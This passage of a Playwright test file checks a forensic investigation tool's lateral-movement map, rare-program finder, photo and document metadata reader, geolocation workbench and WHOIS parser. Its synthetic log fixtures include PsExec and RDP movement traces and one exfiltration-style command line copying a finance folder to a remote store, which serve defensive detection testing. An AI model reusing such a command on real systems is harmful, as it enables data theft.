    const mk = (host, t, body, source) => DB.records.push({ id: 'r-mv' + (i++), caseId: 'c-mv', type: 'evidence', title: body.slice(0, 40), body, ts: T + t * M, tsRaw: '', tsZone: 'explicit', source: source || 'winlog', host, tags: [], ents: extractRich(body), addedAt: Date.now() });
    // WS-HR-03's own connections give its address; FS01's address comes from a logon that names it
    mk('WS-HR-03', 0, 'EventID=3 Image=C:\\Windows\\System32\\svchost.exe SourceIp=10.1.2.15 SourcePort=50111 DestinationIp=10.1.0.10 DestinationPort=53', 'sysmon');
    mk('FS01.corp.local', 1, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.2.15 WorkstationName=- LogonProcessName=NtLmSsp');
    mk('FS01.corp.local', 2, 'EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service StartType=demand start AccountName=LocalSystem');
    mk('WS-HR-03', 3, 'EventID=4648 SubjectUserName=amy TargetUserName=adm_x TargetServerName=FS01.corp.local ProcessName=C:\\Windows\\System32\\net.exe');
    mk('WS-HR-03', 4, 'EventID=3 Image=System SourceIp=10.1.2.15 SourcePort=50200 DestinationIp=10.1.5.20 DestinationPort=445 Protocol=tcp', 'sysmon');
    mk('DC01', 10, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
    mk('DC01', 12, 'EventID=1149 Param1=adm_x Param2=CORP Param3=10.1.5.20', 'rdp');
    mk('DC01', 13, 'EventID=4624 LogonType=10 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
    mk('DC01', 14, 'EventID=4624 LogonType=3 TargetUserName=adm_x IpAddress=10.1.5.20 WorkstationName=FS01');
    mk('BACKUP01', 20, 'EventID=4624 LogonType=3 TargetUserName=scanner IpAddress=198.51.100.77 WorkstationName=-');
    // not movement: interactive, service and loopback logons, a host logging on to itself
    mk('DC01', 30, 'EventID=4624 LogonType=2 TargetUserName=admin IpAddress=127.0.0.1 WorkstationName=DC01');
    mk('DC01', 31, 'EventID=4624 LogonType=3 TargetUserName=DC01$ IpAddress=::1 WorkstationName=-');
    mk('DC01', 32, 'EventID=4624 LogonType=3 TargetUserName=DC01$ IpAddress=10.1.0.10 WorkstationName=DC01');
    mk('DC01', 33, 'EventID=4624 LogonType=5 TargetUserName=SYSTEM IpAddress=- WorkstationName=-');
    rev++; cache = {};
    const X = epMoves(derive('c-mv'));
    return { edges: X.edges.map(e => [e.a, e.b, e.how, (e.first - T) / M, e.n, [...e.users].join(',')]), nodes: X.nodes.map(n => n.h) };
  });
  expect(R.edges).toEqual([
    ['WS-HR-03', 'FS01', 'network logon', 1, 1, 'adm_x'],
    ['WS-HR-03', 'FS01', 'remote service (PsExec-style)', 2, 1, 'adm_x'],
    ['WS-HR-03', 'FS01', 'explicit credentials', 3, 1, 'adm_x'],
    ['WS-HR-03', 'FS01', 'SMB connection', 4, 1, ''],
    ['FS01', 'DC01', 'network logon', 10, 2, 'adm_x'],
    ['FS01', 'DC01', 'RDP connection', 12, 1, 'adm_x'],
    ['FS01', 'DC01', 'RDP logon', 13, 1, 'adm_x'],
    ['198.51.100.77', 'BACKUP01', 'network logon', 20, 1, 'scanner'],
  ]);
  expect(R.nodes).toEqual(['WS-HR-03', 'FS01', 'DC01', '198.51.100.77', 'BACKUP01']);
  await page.evaluate(() => { DB.active = 'c-mv'; UI.tlMode = 'moves'; go(caseHash('c-mv', 'timeline')); });
  await expect(page.locator('.mv-t tbody tr')).toHaveCount(8);
  await expect(page.locator('.mv-svg .mv-n')).toHaveCount(5); await expect(page.locator('.mv-svg .mv-n.ip')).toHaveCount(1);
  await page.locator('.mv-t tbody tr', { hasText: 'RDP logon' }).locator('[data-act=mvShow]').click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.ids.length, recById(UI.facet.ids[0]).body.includes('LogonType=10')])).toEqual(['events', 1, true]);
  await expect(page.locator('#tlV, .tl').first()).toBeVisible();
  noErrors(errors);
});

test('rare things: a program, service or task seen on one host once or twice across all cases is pointed out; per-user paths and software on many hosts are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    for(const id of ['c-ra', 'c-rb']) DB.cases.push({ id, code: id.toUpperCase(), name: id, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9); let i = 0;
    const mk = (caseId, host, body) => DB.records.push({ id: 'r-ra' + (i++), caseId, type: 'evidence', title: 'x', body, ts: T + i * 6e4, tsRaw: '', tsZone: 'explicit', source: 'sysmon', host, tags: [], ents: [], addedAt: Date.now() });
    const common = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\RuntimeBroker.exe', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'C:\\Windows\\System32\\taskhostw.exe', 'C:\\Windows\\System32\\SearchProtocolHost.exe'];
    const hosts = ['WS-01', 'WS-02', 'WS-03', 'WS-04', 'WS-05'];
    for(const h of hosts) for(const p of common) for(let k = 0; k < 3; k++) mk(h < 'WS-03' ? 'c-ra' : 'c-rb', h, `EventID=1 Image=${p} ParentImage=C:\\Windows\\explorer.exe`);
    // a per-user install on every host — the user folder differs, the program is the same
    for(const h of hosts) mk('c-rb', h, `EventID=1 Image=C:\\Users\\${h.toLowerCase()}user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe ParentImage=C:\\Windows\\explorer.exe`);
    // the long tail: one tool, once, on one host; another twice on another host (two different cases)
    mk('c-ra', 'WS-02', 'EventID=1 Image=C:\\Users\\bob\\AppData\\Local\\Temp\\rcl.exe ParentImage=C:\\Windows\\System32\\cmd.exe CommandLine="rcl.exe copy C:\\Finance remote:x"');
    mk('c-rb', 'WS-04', 'EventID=1 Image=C:\\ProgramData\\AnyDesk.exe ParentImage=C:\\Windows\\System32\\cmd.exe');
    mk('c-rb', 'WS-04', 'EventID=1 Image=C:\\ProgramData\\AnyDesk.exe ParentImage=C:\\Windows\\System32\\services.exe');
    // three times on one host is still not "once or twice"
    for(let k = 0; k < 3; k++) mk('c-rb', 'WS-05', 'EventID=1 Image=C:\\Tools\\backup-agent.exe ParentImage=C:\\Windows\\System32\\services.exe');
    // services: nine ordinary ones on many hosts, one installed once
    for(let s = 0; s < 9; s++) for(const h of hosts.slice(0, 3)) mk('c-ra', h, `EventID=7045 ServiceName=Svc${s} ImagePath=C:\\Program Files\\Vendor\\svc${s}.exe`);
    mk('c-ra', 'WS-03', 'EventID=7045 ServiceName=WinUpdSvc ImagePath=C:\\Windows\\Temp\\wupd.exe');
    rev++; cache = {};
    const f = id => epRare(derive(id)).map(x => [x.kind, String(x.label).split('\\').pop(), [...x.hosts][0], x.n]);
    return { a: f('c-ra'), b: f('c-rb') };
  });
  expect(R.a).toEqual([['process', 'rcl.exe', 'WS-02', 1], ['service', 'wupd.exe', 'WS-03', 1]]);
  expect(R.b).toEqual([['process', 'AnyDesk.exe', 'WS-04', 2]]);
  await page.evaluate(() => { DB.active = 'c-ra'; UI.tlMode = 'patterns'; go(caseHash('c-ra', 'timeline')); });
  const card = page.locator('.tlx-c', { hasText: 'Rare things' });
  await expect(card).toContainText('rcl.exe'); await expect(card).toContainText('Only on WS-02, once in all your evidence');
  await expect(card).not.toContainText('Teams.exe');
  noErrors(errors);
});

test('endpoint views stay quick on a large case: 60,000 events', async ({ page }) => {
  const errors = await open(page, '#/home');
  const ms = await page.evaluate(() => {
    DB.cases.push({ id: 'c-big', code: 'BIG', name: 'Big', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2), imgs = ['chrome.exe', 'svchost.exe', 'cmd.exe', 'powershell.exe', 'conhost.exe', 'notepad.exe', 'msedge.exe', 'teams.exe'];
    for(let i = 0; i < 60000; i++){ const h = 'WS-' + (i % 40), k = i % 4;
      const body = k === 0 ? `EventID=1 ProcessId=${i} ParentProcessId=${i - 4} Image=C:\\Windows\\System32\\${imgs[i % 8]} ParentImage=C:\\Windows\\explorer.exe CommandLine="${imgs[i % 8]} --x ${i}"`
        : k === 1 ? `EventID=4624 LogonType=3 TargetUserName=u${i % 50} IpAddress=10.0.${i % 40}.5 WorkstationName=WS-${(i + 1) % 40}`
        : k === 2 ? `EventID=3 SourceIp=10.0.${i % 40}.5 DestinationIp=10.0.${(i + 3) % 40}.5 DestinationPort=${i % 3 ? 443 : 445}` : `GET /index.html 200 user=u${i % 50} https://site${i % 300}.example/`;
      DB.records.push({ id: 'r-big' + i, caseId: 'c-big', type: 'evidence', title: 'e' + i, body, ts: T + i * 1000, tsRaw: '', tsZone: 'explicit', source: 'x', host: h, tags: [], ents: [], addedAt: 0 }); }
    rev++; cache = {}; const D = derive('c-big'), t0 = performance.now();
    const H = epTrees(D), t1 = performance.now(), M = epMoves(D), t2 = performance.now(), R = epRare(D), t3 = performance.now();
    const html = procView(theCase('c-big'), D) + moveView(theCase('c-big'), D), t4 = performance.now();
    return { trees: t1 - t0, moves: t2 - t1, rare: t3 - t2, render: t4 - t3, hosts: H.length, edges: M.edges.length, html: html.length };
  });
  console.log('endpoint timings', JSON.stringify(ms));
  expect(ms.hosts).toBe(10); expect(ms.edges).toBeGreaterThan(10);
  expect(ms.trees + ms.moves + ms.rare + ms.render).toBeLessThan(await budget(page, 8000));
  noErrors(errors);
});

// file metadata: real phone, camera and office files
const metaFix = name => require('fs').readFileSync(require('path').join(__dirname, 'fixtures/meta', name)).toString('base64');
test('file metadata from real files: HEIC, JPEG (EXIF, XMP, IPTC), WebP, PNG, MOV, MP4, MP3, PDF (plain and compressed) and Word — checked against an independent reader', async ({ page }) => {
  const errors = await open(page, '#/home');
  const names = ['iphone11pro.heic', 'exif-at-eof.heic', 'iphone6-gps.jpg', 'canon-lightroom-xmp-iptc.jpg', 'fuji-iptc-gps.jpg', 'iptc-122.jpg', 'htc-desire.webp', 'exif-chunk.png', 'sd-generated.png', 'iphone6-gps.mov', 'gps.mp4', 'id3.mp3', 'libreoffice.pdf', 'objstm.pdf', 'libreoffice.docx'];
  const files = Object.fromEntries(names.map(n => [n, metaFix(n)]));
  const R = await page.evaluate(async files => { const out = {};
    for(const [n, b64] of Object.entries(files)){ const M = await metaRead(Uint8Array.from(atob(b64), c => c.charCodeAt(0)), n, '');
      const f = {}; for(const x of M.fields) if(x.g !== 'Stands out' && !(x.k in f)) f[x.k] = x.v;
      out[n] = { fmt: M.fmt, f, gps: M.gps, taken: M.taken, flags: M.flags.map(x => x.t), people: M.people }; }
    // broken and odd input never throws
    const junk = [new Uint8Array(0), Uint8Array.from({ length: 5000 }, (_, i) => (i * 7919) & 255), Uint8Array.from(atob(files['iphone11pro.heic']).slice(0, 3000), c => c.charCodeAt(0)), Uint8Array.from(atob(files['gps.mp4']).slice(0, 2000), c => c.charCodeAt(0)), Uint8Array.from(atob(files['libreoffice.pdf']).slice(0, 700), c => c.charCodeAt(0))];
    out.junk = []; for(const j of junk){ try{ const M = await metaRead(j, 'x', ''); out.junk.push(M.fields.length >= 0); }catch(e){ out.junk.push('threw ' + e.message); } }
    return out; }, files);
  const day = ms => new Date(ms).toISOString().replace('.000Z', 'Z');
  // iPhone 11 Pro HEIC (independent reader: Make Apple, Model iPhone 11 Pro, Software 13.4.1, Original 2020:05:04 18:39:11, Time Zone -04:00)
  expect(R['iphone11pro.heic']).toMatchObject({ fmt: 'HEIC picture', gps: null });
  expect(R['iphone11pro.heic'].f).toMatchObject({ Make: 'Apple', Model: 'iPhone 11 Pro', Software: '13.4.1', Taken: '2020:05:04 18:39:11', 'Time zone (taken)': '-04:00', 'Lens model': 'iPhone 11 Pro back triple camera 4.25mm f/1.8' });
  expect(day(R['iphone11pro.heic'].taken)).toBe('2020-05-04T22:39:11Z');                     // the local time with its zone, in UTC
  expect(R['iphone11pro.heic'].flags.join()).not.toMatch(/Changed after/);
  // Exif stored at the end of the HEIC file, with GPS 47° 12' 25.65" N, 106° 14' 35.18" E
  expect(R['exif-at-eof.heic'].gps.lat).toBeCloseTo(47.207125, 5); expect(R['exif-at-eof.heic'].gps.lon).toBeCloseTo(106.243106, 5);   // the other reader rounds the seconds
  // iPhone 6 JPEG: 51° 45' 44.67" N, 0° 19' 4.41" W, 111.26 m, facing 23° true, and iOS 8's day-of-year GPS date (259 → 16 September)
  expect(R['iphone6-gps.jpg'].gps).toMatchObject({ lat: 51.762408, lon: -0.317892, alt: 111, dir: 23, dirRef: 'true' });
  expect(R['iphone6-gps.jpg'].f['GPS date (UTC)']).toBe('2014:09:16');
  expect(R['iphone6-gps.jpg'].f['Camera facing']).toBe('23° (north-east, true)');
  expect(R['iphone6-gps.jpg'].f['Time zone (taken)']).toBe('UTC+01:00 — worked out from the GPS clock');   // 14:05 on the camera, 13:05 on the GPS clock (British Summer Time)
  expect(day(R['iphone6-gps.jpg'].taken)).toBe('2014-09-16T13:05:12Z');
  expect(R['canon-lightroom-xmp-iptc.jpg'].f['Time zone (taken)']).toMatch(/not recorded/);
  // Lightroom export: XMP and IPTC side by side, with the edit
  expect(R['canon-lightroom-xmp-iptc.jpg'].f).toMatchObject({ City: 'iptc image-city', 'Sub-location': 'iptc image-location', 'Country code': 'GBR', 'By-line': 'iptc creator-creator', Headline: 'iptc-headline', Software: 'Adobe Photoshop Lightroom', 'Serial number': '556769' });
  expect(R['canon-lightroom-xmp-iptc.jpg'].flags.join('\n')).toMatch(/Saved by an editing program: Adobe Photoshop Lightroom/);
  // Fuji via Photoshop 7: a negative degree as well as "W" — the sign is applied once (independent reader: 54° 59' 22.8" N, -1° 54' 51" W)
  expect(R['fuji-iptc-gps.jpg'].gps).toMatchObject({ lat: 54.989667, lon: -1.914167 });
  expect(R['fuji-iptc-gps.jpg'].people).toEqual(['Ian Britton']);
  // a Getty news picture: place and photographer from IPTC
  expect(R['iptc-122.jpg'].f).toMatchObject({ City: 'Pasadena', 'State / province': 'CA', Country: 'United States', 'By-line': 'Stephen Dunn', Credit: 'Getty Images' });
  expect(R['iptc-122.jpg'].people).toEqual(['Stephen Dunn']);
  // WebP from an HTC Desire: 45° 30' 2.4" N, 9° 6' 37.2" E
  expect(R['htc-desire.webp']).toMatchObject({ fmt: 'WebP picture', gps: { lat: 45.500667, lon: 9.110333 } }); expect(R['htc-desire.webp'].f.Model).toBe('HTC Desire');
  // PNG: an eXIf chunk and an editing app; a Stable Diffusion picture says so
  expect(R['exif-chunk.png'].f).toMatchObject({ Make: 'samsung', Model: 'SM-S911B', Software: 'Snapseed 2.0' }); expect(R['exif-chunk.png'].flags.join()).toMatch(/editing program: Snapseed/);
  expect(R['sd-generated.png'].flags.join('\n')).toMatch(/AI-generated: Stable Diffusion/); expect(R['sd-generated.png'].f['Generation settings']).toMatch(/Steps: 28, Sampler: DPM\+\+ 2M Karras/);
  // iPhone video: Apple's keys (independent reader: ISO 6709 +32.0929+034.8620+028.516/, iPhone 6, 12.3, 2019-07-24T11:25:40+0300)
  expect(R['iphone6-gps.mov']).toMatchObject({ fmt: 'QuickTime video', gps: { lat: 32.0929, lon: 34.862, alt: 29 } });
  expect(R['iphone6-gps.mov'].f).toMatchObject({ Make: 'Apple', Model: 'iPhone 6', Software: '12.3' }); expect(day(R['iphone6-gps.mov'].taken)).toBe('2019-07-24T08:25:40Z');
  // Android video: ©xyz in udta, which the independent reader does not show — read here: +51.4169-000.0806/
  expect(R['gps.mp4'].gps).toMatchObject({ lat: 51.4169, lon: -0.0806 }); expect(R['gps.mp4'].f['Android version']).toBe('6.0.1'); expect(day(R['gps.mp4'].taken)).toBe('2017-02-22T08:20:28Z');
  // MP3 ID3v2
  expect(R['id3.mp3'].f).toMatchObject({ Title: 'Test Track Title', Artist: 'Test Artist Name', Album: 'Test Album Title' });
  // PDF from LibreOffice, and the same PDF with its information compressed in object streams
  for(const n of ['libreoffice.pdf', 'objstm.pdf']) expect(R[n].f, n).toMatchObject({ Author: 'Dana Whitfield', Title: 'Q3 shipment schedule', 'Made with': 'Writer', 'Converted to PDF by': 'LibreOffice 24.2' });
  // Word: who wrote it, who saved it last, the program, revision
  expect(R['libreoffice.docx'].f).toMatchObject({ Author: 'Dana Whitfield', 'Last saved by': 'm.reyes', Created: '2023-01-10T08:30:00Z', 'Last saved': '2024-02-02T17:05:00Z', Revision: '7' });
  expect(R['libreoffice.docx'].f['Made with']).toMatch(/^LibreOffice\/24\.2/);
  expect(R['libreoffice.docx'].flags.join('\n')).toMatch(/Written by Dana Whitfield, last saved by m\.reyes/);
  expect(R.junk).toEqual([true, true, true, true, true]);
  noErrors(errors);
});

test('files added to a case keep their metadata: the event takes the capture time, GPS goes on the map, the evidence panel shows what stands out, and older files are read once', async ({ page }) => {
  const errors = await open(page, '#/home');
  const files = { 'iphone6-gps.jpg': metaFix('iphone6-gps.jpg'), 'iphone6-gps.mov': metaFix('iphone6-gps.mov'), 'libreoffice.docx': metaFix('libreoffice.docx'), 'gps.mp4': metaFix('gps.mp4') };
  await page.evaluate(async files => {
    DB.cases.push({ id: 'c-mt', code: 'MT-1', name: 'Metadata', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-mt'; UI.capCase = 'c-mt';
    const mk = (n, type) => new File([Uint8Array.from(atob(files[n]), c => c.charCodeAt(0))], n, { type, lastModified: Date.UTC(2025, 0, 1) });
    await attachFiles([mk('iphone6-gps.jpg', 'image/jpeg'), mk('iphone6-gps.mov', 'video/quicktime'), mk('libreoffice.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')]);
  }, files);
  const R = await page.evaluate(() => { const L = DB.records.filter(r => r.caseId === 'c-mt');
    return L.map(r => ({ name: r.att[0].name, ts: new Date(r.ts).toISOString(), gps: r.att[0].gps, coords: r.ents.filter(e => e.k === 'coords').map(e => e.v), body: r.body })); });
  const by = n => R.find(x => x.name === n);
  expect(by('iphone6-gps.jpg').ts).toBe('2014-09-16T13:05:12.000Z');                         // when it was taken (in UTC, from the GPS clock), not when the file was copied
  expect(by('iphone6-gps.jpg').coords).toEqual(['51.76241,-0.31789']);
  expect(by('iphone6-gps.mov').ts).toBe('2019-07-24T08:25:40.000Z'); expect(by('iphone6-gps.mov').body).toMatch(/Video GPS: 32\.092900, 34\.862000/);
  expect(by('libreoffice.docx').ts).toBe('2023-01-10T08:30:00.000Z'); expect(by('libreoffice.docx').body).toMatch(/Author: Dana Whitfield[\s\S]*Last saved by: m\.reyes/);
  // the map has both places, labelled by where they came from
  const P = await page.evaluate(() => mapData('c-mt').pts.map(p => [p.la, p.lo, [...p.src].join()]).sort());
  expect(P).toEqual([[32.0929, 34.862, 'Video GPS'], [51.76241, -0.31789, 'Photo GPS']]);
  // the evidence panel: what stands out first, then the facts that matter, all of them on request
  await page.evaluate(() => { const r = DB.records.find(x => x.caseId === 'c-mt' && x.att[0].name === 'iphone6-gps.jpg'); UI.sel = { kind: 'rec', id: r.id }; UI.inspOpen = true; UI.tlMode = 'events'; go(caseHash('c-mt', 'timeline')); });
  const mt = page.locator('.mt').first();
  await expect(mt).toContainText('JPEG picture'); await expect(mt.locator('.chip')).toContainText(['Location recorded (EXIF)']);
  await expect(mt).toContainText('Camera facing'); await expect(mt).toContainText('iPhone 6');
  await mt.locator('[data-act=mtMore]').click();
  await expect(page.locator('.mt').first().locator('h5')).toContainText(['Where', 'When', 'Device', 'Software', 'File']);
  await page.locator('.mt').first().locator('[data-act=mtMap]').click();
  await expect(page.locator('.pcard.on')).toContainText('iphone6-gps.jpg');
  // a phone video too big to store: its metadata box is read from wherever it sits in the file
  const big = await page.evaluate(async b64 => { const u = Uint8Array.from(atob(b64), c => c.charCodeAt(0)); const boxes = []; let o = 0; while(o + 8 <= u.length){ const s = ((u[o] << 24) | (u[o + 1] << 16) | (u[o + 2] << 8) | u[o + 3]) >>> 0; boxes.push([String.fromCharCode(...u.slice(o + 4, o + 8)), u.slice(o, o + s)]); o += s; }
    const ftyp = boxes.find(b => b[0] === 'ftyp')[1], moov = boxes.find(b => b[0] === 'moov')[1], pad = 70 * 1048576, mdat = new Uint8Array(8); new DataView(mdat.buffer).setUint32(0, pad + 8); mdat.set([109, 100, 97, 116], 4);
    const f = new File([ftyp, mdat, new Uint8Array(pad), moov], 'long-clip.mp4', { type: 'video/mp4' }); const M = await metaReadFile(f); return { size: f.size, gps: M.gps }; }, files['gps.mp4']);
  expect(big.size).toBeGreaterThan(70 * 1048576); expect(big.gps).toMatchObject({ lat: 51.4169, lon: -0.0806 });
  // a file stored before the reader existed is read once in the background
  const old = await page.evaluate(async b64 => { const m = await storeFile(new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'old.mp4', { type: 'video/mp4' })); delete m.meta; m.gps = null;
    const r = fileRecord(m, 'c-mt'); DB.records.push(r); metaScanFiles(); await new Promise(res => setTimeout(res, 2500)); return { meta: !!m.meta && !m.meta.none, gps: m.gps, coords: r.ents.filter(e => e.k === 'coords').map(e => e.v) }; }, files['gps.mp4']);
  expect(old).toEqual({ meta: true, gps: { lat: 51.4169, lon: -0.0806, alt: null }, coords: ['51.41690,-0.08060'] });
  noErrors(errors);
});

test('geolocation workbench: clues, candidate places from any coordinate format, the sun at each place and moment, verdicts; the confirmed place goes on the map and into the vault', async ({ page }) => {
  const errors = await open(page, '#/home');
  // coordinates as people paste them, and the sun checked against an independent library (astral)
  const U = await page.evaluate(() => ({
    p: ['51.7624, -0.3179', '51°45\'44.7"N 0°19\'04.4"W', '0°19\'04.4"W 51°45\'44.7"N', '51.7624 N, 0.3179 W', 'https://www.google.com/maps/place/X/@51.7624,-0.3179,17z/data=!3m1!4b1!4m6!3m5!1s0x0:0x0!8m2!3d51.76241!4d-0.31789', 'https://www.openstreetmap.org/?mlat=51.7624&mlon=-0.3179#map=17/51.7624/-0.3179', 'https://www.google.com/maps/search/?api=1&query=51.7624%2C-0.3179', 'near the bridge', '91, 10', '51.7624'].map(geoParse),
    s: [[Date.UTC(2014, 8, 16, 13, 5, 12), 51.762408, -0.317892], [Date.UTC(2019, 6, 24, 8, 25, 40), 32.0929, 34.862], [Date.UTC(2024, 11, 21, 23, 0), -33.8568, 151.2153], [Date.UTC(2024, 5, 21, 0, 30), 64.1466, -21.9426]].map(([t, a, b]) => sunAt(t, a, b)) }));
  expect(U.p.slice(0, 7).map(x => x && [x.lat.toFixed(3), x.lon.toFixed(3)])).toEqual(Array(7).fill(['51.762', '-0.318']));
  expect(U.p.slice(7)).toEqual([null, null, null]);
  const astral = [[202.3, 38.7], [118.8, 68.1], [86.3, 50.8], [346.4, -1.4]];
  U.s.forEach((s, i) => { expect(Math.abs(s.az - astral[i][0]), 'azimuth ' + i).toBeLessThan(1); expect(Math.abs(s.alt - astral[i][1]), 'height ' + i).toBeLessThan(1); });

  await page.evaluate(async b64 => { DB.cases.push({ id: 'c-geo', code: 'GE-1', name: 'Geo', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-geo'; UI.capCase = 'c-geo';
    await attachFiles([new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'IMG_0412.jpg', { type: 'image/jpeg' })]); }, metaFix('iphone6-gps.jpg'));
  await page.locator('[data-act=geoOpen]').click();
  const dlg = page.locator('#dlg');
  await expect(dlg.locator('.geo-facts')).toContainText('51.762408, -0.317892'); await expect(dlg.locator('.geo-facts')).toContainText('23° (north-east, true)');
  await expect(dlg.locator('.geo-facts')).not.toContainText('time zone not recorded');
  // clues
  for(const [k, t] of [['road', 'Cars drive on the left'], ['sign', 'Red brick terrace with sash windows'], ['sky', 'Shadows fall towards the camera, sun behind the houses']]){ await dlg.locator('#geoK').selectOption(k); await dlg.locator('#geoT').fill(t); await dlg.locator('#geoT').press('Enter'); }
  await expect(dlg.locator('.geo-cl li')).toHaveCount(3);
  await dlg.locator('#geoT').fill('cars drive on the LEFT'); await dlg.locator('#geoT').press('Enter');
  await expect(dlg.locator('.field-err, [role=alert], .err').first()).toContainText('already on the list');
  // places: the file's own location, a Google Maps link 2 km away, and a wrong country
  await dlg.locator('[data-act=geoFromFile]').click();
  await dlg.locator('#geoN').fill('St Albans, Fleetville'); await dlg.locator('#geoP').fill('https://www.google.com/maps/@51.7510,-0.3005,18z'); await dlg.locator('#geoP').press('Enter');
  await dlg.locator('#geoN').fill('Dublin, Rathmines'); await dlg.locator('#geoP').fill('53°19\'21.6"N 6°15\'54.0"W'); await dlg.locator('#geoP').press('Enter');
  await dlg.locator('#geoN').fill('again'); await dlg.locator('#geoP').fill('51.75101, -0.30051'); await dlg.locator('#geoP').press('Enter');
  await expect(dlg.locator('.field-err, [role=alert], .err').first()).toContainText('within 25 m');
  await expect(dlg.locator('.geo-c')).toHaveCount(3);
  const fleet = dlg.locator('.geo-c', { hasText: 'Fleetville' });
  await expect(fleet).toContainText('from the file\'s GPS');
  await expect(fleet.locator('.geo-sun')).toContainText(/Sun at 20\d° \(south-south-west\), 3[89]° up; shadows point 2\d° \(north-north-east\)/);
  await expect(fleet.locator('.geo-sun')).not.toContainText('assumed');
  // check clues against places; set verdicts
  await fleet.locator('.geo-fit', { hasText: 'Cars drive on the left' }).click();
  await dlg.locator('.geo-c', { hasText: 'Fleetville' }).locator('.geo-fit', { hasText: 'Red brick' }).click();
  await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('.geo-fit', { hasText: 'Red brick' }).click(); await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('.geo-fit', { hasText: 'Red brick' }).click();   // fits → does not fit
  await expect(dlg.locator('.geo-c', { hasText: 'Dublin' })).toContainText('0 fit · 1 do not');
  await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('[data-act=geoVerdict][data-v=out]').click();
  await dlg.locator('.geo-c', { hasText: 'Location in the file' }).locator('[data-act=geoVerdict][data-v=confirmed]').click();
  await dlg.locator('.geo-c', { hasText: 'Fleetville' }).locator('[data-act=geoVerdict][data-v=confirmed]').click();        // only one place is confirmed
  await expect(dlg.locator('.geo-c').first()).toContainText('Fleetville');                                                   // confirmed first, ruled out last
  await expect(dlg.locator('.geo-c').last()).toContainText('Dublin');
  await dlg.locator('textarea[data-geonote]').first().fill('Terrace and bus stop match Street View 2019');
  await page.waitForTimeout(600);
  const G = await page.evaluate(() => { const r = DB.records.find(x => x.caseId === 'c-geo'); const g = geoOf(r); return { v: g.cands.map(c => [c.name, c.verdict, Object.values(c.fit).join('')]), note: g.cands.find(c => c.verdict === 'confirmed').note }; });
  expect(G.v).toEqual([['Location in the file', 'likely', ''], ['St Albans, Fleetville', 'confirmed', 'yy'], ['Dublin, Rathmines', 'out', 'n']]);
  expect(G.note).toBe('Terrace and bus stop match Street View 2019');
  await dlg.locator('[data-act=geoVault]').click();
  await expect(dlg.locator('[data-act=geoVault]')).toHaveCount(0);
  const V = await page.evaluate(() => ({ e: DB.entries.filter(e => e.caseId === 'c-geo' && e.type === 'location').map(e => [e.fields.address, e.fields.coordinates, e.tags.join()]),
    pts: mapData('c-geo').pts.map(p => [p.la.toFixed(4), p.lo.toFixed(4), [...p.src].sort().join('+')]).sort() }));
  expect(V.e).toEqual([['St Albans, Fleetville', '51.751, -0.3005', 'geolocated']]);
  expect(V.pts).toEqual([['51.7510', '-0.3005', 'Geolocated+Location entry'], ['51.7624', '-0.3179', 'Photo GPS']]);
  await page.click('[data-act=dclose]');
  await expect(page.locator('.isec', { hasText: 'Where was this taken?' })).toContainText('3 clues · 3 places · Confirmed: St Albans, Fleetville');
  // what comes back from a backup is checked: junk is dropped, the rest kept
  const S = await page.evaluate(() => { const r = { geo: { clues: [{ id: 'a', kind: 'zzz', text: 'ok' }, { id: 'b', text: '' }, 5], cands: [{ id: 'c', lat: 95, lon: 0 }, { id: 'd', lat: 1, lon: 2, verdict: 'hacked', fit: { a: 'y', zz: 'y', q: 'maybe' } }] } }; return geoOf(r); });
  expect(S).toEqual({ clues: [{ id: 'a', kind: 'other', text: 'ok' }], cands: [{ id: 'd', name: '', lat: 1, lon: 2, verdict: '', note: '', fit: { a: 'y' }, entry: '' }], note: '' });
  noErrors(errors);
});

// infrastructure pivots
const infraFix = p => require('fs').readFileSync(require('path').join(__dirname, 'fixtures/infra', p), 'latin1');
test('WHOIS from 66 real registry answers: the domain, registrar and creation date are read as another parser reads them', async ({ page }) => {
  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/infra');
  const W = fs.readdirSync(dir + '/whois').map(f => [f, infraFix('whois/' + f), fs.existsSync(dir + '/expected/' + f) ? JSON.parse(fs.readFileSync(dir + '/expected/' + f, 'utf8')) : {}]);
  const R = await page.evaluate(W => W.map(([f, t, x]) => { const P = infraParse(t), dom = P && P.label.replace(/^WHOIS — /, ''), reg = P ? (P.facts.find(q => q.rel === 'registrar') || {}).v || '' : '', cr = P && P.attrs ? Object.values(P.attrs)[0].created : null;
    const xd = x.domain_name && String([].concat(x.domain_name)[0]).toLowerCase(), xr = x.registrar, xc = x.creation_date && String([].concat(x.creation_date)[0]).slice(0, 10);
    return { f, dom: !xd || dom === xd, reg: !xr || reg.toLowerCase() === String(xr).toLowerCase(), cr: !xc || (cr && new Date(cr).toISOString().slice(0, 10)) === xc }; }), W);
  const miss = k => R.filter(r => !r[k]).map(r => r.f);
  expect(R).toHaveLength(66);
  expect(miss('dom')).toEqual(['nic.live']);                                                     // that answer is about the .live registry itself
  // registrars this reader takes from the registry part of an old multi-record answer, or from a section header the other parser knows by country
  expect(miss('reg').length).toBeLessThanOrEqual(10);
  expect(miss('cr').length).toBeLessThanOrEqual(6);
  noErrors(errors);
});

